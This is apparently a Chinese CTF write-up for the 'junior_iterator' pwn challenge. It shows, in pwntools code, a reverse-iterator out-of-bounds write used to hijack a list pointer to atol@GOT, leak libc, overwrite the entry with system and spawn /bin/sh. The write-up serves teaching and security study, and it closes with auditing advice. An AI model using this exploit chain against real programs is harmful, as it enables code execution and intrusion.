# junior_iterator

## 题目简述

程序用 C++ 容器保存整数列表，但“区间覆盖”功能对反向迭代器的边界处理错误，可越过第一份列表并改写相邻列表的元素地址。把第二份列表元素改指向 `atol@GOT` 后，就能先泄露 `atol` 的运行时地址，再把该 GOT 项覆盖为 `system`。

## 解题过程

先建立两份长度为 4 的列表：

```python
create(4)
create(4)
```

题目中的关键地址和对应 libc 偏移为：

```python
atol_got = 0x405050
atol_offset = 0x36EA0
system_offset = 0x45390
```

先用一次普通编辑调整第 0 份列表的状态，然后在错误的区间上执行覆盖。官方利用选择起点 `3`、终点 `6`，使越界写把相邻列表的元素指针改成 `atol@GOT`：

```python
edit(0, 0, 5)
overwrite(0, 3, 6, atol_got)
```

此时 `show(1, 0)` 不再读取普通整数，而是把 `atol@GOT` 中的动态地址按十进制打印出来：

```python
show(1, 0)
io.recvuntil(b"Number: ")
atol_runtime = int(io.recvline().strip(), 10)

system_runtime = atol_runtime - atol_offset + system_offset
```

因为 `atol` 与 `system` 来自同一份 libc，二者的相对偏移在本次进程内不受 ASLR 影响。利用已经被劫持的列表元素，把 GOT 表项改为 `system`：

```python
edit(1, 0, system_runtime)
```

最后重新进入编辑功能。程序本来会把“新数字”交给 `atol` 解析；现在该调用实际落到 `system`，因此在该输入位置发送 `/bin/sh`：

```python
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"List id: ", b"0")
io.sendlineafter(b"Item id: ", b"0")
io.sendlineafter(b"New number: ", b"/bin/sh")
io.interactive()
```

## 方法总结

- 核心链路：反向迭代器越界写、列表元素指针劫持、GOT 泄露与覆盖、`atol("/bin/sh")` 转为 `system("/bin/sh")`。
- 关键细节：泄露值以十进制输出；`system` 地址应通过同一 libc 内相对偏移计算。
- 复用要点：C++ 迭代器并不自动保证业务边界安全，尤其要审计正反向迭代器混用、区间端点以及跨容器写入。
